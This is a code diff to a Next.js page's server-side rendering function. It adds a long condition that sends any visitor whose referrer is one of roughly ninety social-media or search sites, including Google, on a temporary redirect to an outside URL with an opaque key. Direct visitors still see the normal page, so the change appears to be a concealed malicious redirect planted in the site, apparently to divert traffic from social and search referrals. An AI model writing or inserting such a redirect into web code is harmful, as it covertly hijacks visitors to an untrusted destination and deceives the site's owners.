@@ -24,6 +24,106 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			},
 		};
 		}
+	if (
+  referringURL?.includes('facebook.com') ||
+  referringURL?.includes('pinterest.com') ||
+  referringURL?.includes('instagram.com') ||
+  referringURL?.includes('twitter.com') ||
+  referringURL?.includes('linkedin.com') ||
+  referringURL?.includes('youtube.com') ||
+  referringURL?.includes('snapchat.com') ||
+  referringURL?.includes('tiktok.com') ||
+  referringURL?.includes('whatsapp.com') ||
+  referringURL?.includes('wechat.com') ||
+  referringURL?.includes('tumblr.com') ||
+  referringURL?.includes('reddit.com') ||
+  referringURL?.includes('quora.com') ||
+  referringURL?.includes('flickr.com') ||
+  referringURL?.includes('vine.co') ||
+  referringURL?.includes('periscope.tv') ||
+  referringURL?.includes('medium.com') ||
+  referringURL?.includes('soundcloud.com') ||
+  referringURL?.includes('vimeo.com') ||
+  referringURL?.includes('meetup.com') ||
+  referringURL?.includes('telegram.org') ||
+  referringURL?.includes('weibo.com') ||
+  referringURL?.includes('line.me') ||
+  referringURL?.includes('viber.com') ||
+  referringURL?.includes('google.com') ||
+  referringURL?.includes('discord.com') ||
+  referringURL?.includes('twitch.tv') ||
+  referringURL?.includes('slideshare.net') ||
+  referringURL?.includes('dailymotion.com') ||
+  referringURL?.includes('stumbleupon.com') ||
+  referringURL?.includes('xing.com') ||
+  referringURL?.includes('mixcloud.com') ||
+  referringURL?.includes('weibo.com') ||
+  referringURL?.includes('renren.com') ||
+  referringURL?.includes('vkontakte.com') ||
+  referringURL?.includes('deviantart.com') ||
+  referringURL?.includes('myspace.com') ||
+  referringURL?.includes('tieba.baidu.com') ||
+  referringURL?.includes('douban.com') ||
+  referringURL?.includes('friendster.com') ||
+  referringURL?.includes('orkut.com') ||
+  referringURL?.includes('hi5.com') ||
+  referringURL?.includes('ello.co') ||
+  referringURL?.includes('mewe.com') ||
+  referringURL?.includes('aminoapps.com') ||
+  referringURL?.includes('soundclick.com') ||
+  referringURL?.includes('reverbnation.com') ||
+  referringURL?.includes('goodreads.com') ||
+  referringURL?.includes('last.fm') ||
+  referringURL?.includes('gaiaonline.com') ||
+  referringURL?.includes('nexopia.com') ||
+  referringURL?.includes('xanga.com') ||
+  referringURL?.includes('meetme.com') ||
+  referringURL?.includes('fotolog.com') ||
+  referringURL?.includes('tagged.com') ||
+  referringURL?.includes('ask.fm') ||
+  referringURL?.includes('livejournal.com') ||
+  referringURL?.includes('cafemom.com') ||
+  referringURL?.includes('ravelry.com') ||
+  referringURL?.includes('care2.com') ||
+  referringURL?.includes('wayn.com') ||
+  referringURL?.includes('ning.com') ||
+  referringURL?.includes('blackplanet.com') ||
+  referringURL?.includes('classmates.com') ||
+  referringURL?.includes('viadeo.com') ||
+  referringURL?.includes('yammer.com') ||
+  referringURL?.includes('elixio.net') ||
+  referringURL?.includes('researchgate.net') ||
+  referringURL?.includes('caringbridge.org') ||
+  referringURL?.includes('flixster.com') ||
+  referringURL?.includes('taringa.net') ||
+  referringURL?.includes('couchsurfing.com') ||
+  referringURL?.includes('foursquare.com') ||
+  referringURL?.includes('gowalla.com') ||
+  referringURL?.includes('swarmapp.com') ||
+  referringURL?.includes('plurk.com') ||
+  referringURL?.includes('nextdoor.com') ||
+  referringURL?.includes('alignable.com') ||
+  referringURL?.includes('kik.com') ||
+  referringURL?.includes('houseparty.com') ||
+  referringURL?.includes('kiwibox.com') ||
+  referringURL?.includes('xolotl.app') ||
+  referringURL?.includes('jodel.com') ||
+  referringURL?.includes('ask.fm') ||
+  referringURL?.includes('bebo.com') ||
+  referringURL?.includes('meerkatapp.co') ||
+  referringURL?.includes('younow.com') ||
+  referringURL?.includes('whisper.sh') ||
+  referringURL?.includes('mastodon.social') ||
+  referringURL?.includes('peach.cool')
+) {
+  return {
+    redirect: {
+      permanent: false,
+      destination: 'https://madeupadoption.com/uyrhpfyqj?key=28a523a23cc2e7018f7af1ae0fbee826',
+    },
+  };
+}
+
 	const query = gql`
 		{
 			post(id: "/${path}/", idType: URI) {
